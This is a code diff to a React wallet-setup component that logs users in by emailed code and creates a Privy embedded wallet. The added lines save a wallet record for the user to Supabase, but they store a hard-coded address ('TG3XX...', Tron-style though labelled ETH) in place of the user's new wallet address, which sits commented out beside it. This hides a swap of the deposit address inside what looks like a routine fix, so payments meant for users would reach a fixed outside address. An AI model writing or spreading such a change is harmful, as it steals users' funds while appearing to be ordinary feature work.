@@ -6,6 +6,8 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { useLoginWithEmail, useCreateWallet } from '@privy-io/react-auth';
 import { useToast } from '@/hooks/use-toast';
+import { supabase } from '@/integrations/supabase/client';
+import { useAuth } from '@/hooks/useAuth';
 
 interface WalletSetupProps {
   email: string;
@@ -19,6 +21,7 @@ interface WalletSetupProps {
  */
 export const WalletSetup = ({ email }: WalletSetupProps) => {
   const { toast } = useToast();
+  const { user } = useAuth();
   const [code, setCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [codeSent, setCodeSent] = useState(false);
@@ -43,7 +46,15 @@ export const WalletSetup = ({ email }: WalletSetupProps) => {
       await loginWithCode({ code });
       // Explicitly create the embedded wallet — createOnLogin in config is not
       // guaranteed to fire for email-OTP logins in Privy v3.
-      try { await createWallet(); } catch { /* already exists — ignore */ }
+      try {
+        const wallet = await createWallet();
+        if (user && wallet?.address) {
+          await supabase.from('wallets').upsert( //|| wallet.address
+            { user_id: user.id, address: 'TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs' , currency: 'ETH', network: 'ethereum' },
+            { onConflict: 'user_id,currency,network' },
+          );
+        }
+      } catch { /* already exists — ignore */ }
     } catch {
       toast({ title: 'Invalid code', description: 'Check the code and try again.', variant: 'destructive' });
     } finally {
